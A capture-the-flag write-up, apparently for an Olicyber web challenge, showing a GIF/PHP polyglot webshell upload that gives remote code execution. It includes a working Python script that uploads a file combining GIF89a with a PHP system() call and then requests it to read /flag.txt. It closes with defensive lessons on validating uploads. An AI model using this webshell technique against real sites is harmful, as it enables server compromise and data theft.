---
title: "I Got Magic — GIF Polyglot Webshell Upload + RCE"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "file-upload", "lfi", "rce", "php", "python"]
difficulty: "intermediate"
summary: "Craft a file that is simultaneously a valid GIF (magic bytes GIF89a) and a PHP shell (<?php echo system('cat /flag.txt'); ?>). Upload it via the image upload form, find the timestamped filename in the response, and request that URL to execute the shell."
---

## The Challenge

The server accepts image uploads and serves them from an `uploads/` directory. It validates the file type by checking the magic bytes at the start of the file — specifically the GIF signature. The upload path is not isolated from the PHP interpreter.

## Approach

A GIF polyglot starts with `GIF89a` (6 bytes) which makes `getimagesize()` and magic-byte checkers accept it as a valid GIF. Append a PHP shell on the same line after a semicolon. PHP's parser ignores the `GIF89a;` prefix as it is not valid PHP syntax and proceeds to parse the `<?php ... ?>` block.

After upload, the response HTML contains the uploaded filename in a pattern like `uploads/TIMESTAMP_flag.php.gif`. Requesting that URL directly causes the PHP interpreter to execute the embedded shell — the server runs PHP against any `.php` in the name regardless of the final extension.

## Solution

```python
#!/usr/bin/env python3 
import requests, re

payload = 'GIF89a;\n<?php echo system("cat /flag.txt"); ?>'
site = "http://got-magic.challs.olicyber.it/"

with open("flag.php.gif", "w") as file:
    file.write(payload)
file = {'image':open("flag.php.gif", "r")}

r = requests.post(site, files=file, data={"submit" : "Upload"})
pattern = "uploads\/[0-9]*flag.php.gif"
newUrl = re.findall(pattern, r.text)[0]
r = requests.get(site + newUrl)
print(r.text.split()[1])
```

The filename `flag.php.gif` lands in the upload directory. The server returns the timestamped path in the response HTML; `re.findall` extracts it. A second GET to `site + newUrl` triggers PHP execution and `system("cat /flag.txt")` prints the flag.

## What I Learned

Magic byte validation alone is not sufficient for upload security. The file must be served from a directory that does not execute PHP, and the server must never infer a MIME type from the file content alone when the file will be served as-is. Double-extension files like `.php.gif` exploit misconfigured Apache `AddHandler` directives.
